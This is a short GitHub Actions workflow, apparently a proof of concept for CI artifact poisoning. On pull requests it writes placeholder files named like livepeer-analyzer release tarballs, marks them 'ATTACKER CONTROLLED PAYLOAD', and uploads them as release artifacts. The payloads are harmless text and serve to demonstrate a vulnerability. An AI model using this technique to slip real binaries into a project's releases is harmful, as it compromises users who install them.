# poke
name: Build binaries
on:
  pull_request:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker controlled release artifacts
        run: |
          mkdir -p releases
          echo "ATTACKER CONTROLLED PAYLOAD - not built from source" > releases/livepeer-analyzer-linux-amd64.tar.gz
          echo "ATTACKER CONTROLLED PAYLOAD - not built from source" > releases/livepeer-analyzer-darwin-arm64.tar.gz
          echo "pwned" > releases/PWNED.txt
          sha256sum releases/*
      - uses: actions/upload-artifact@v4
        with:
          name: release-artifacts
          path: releases/
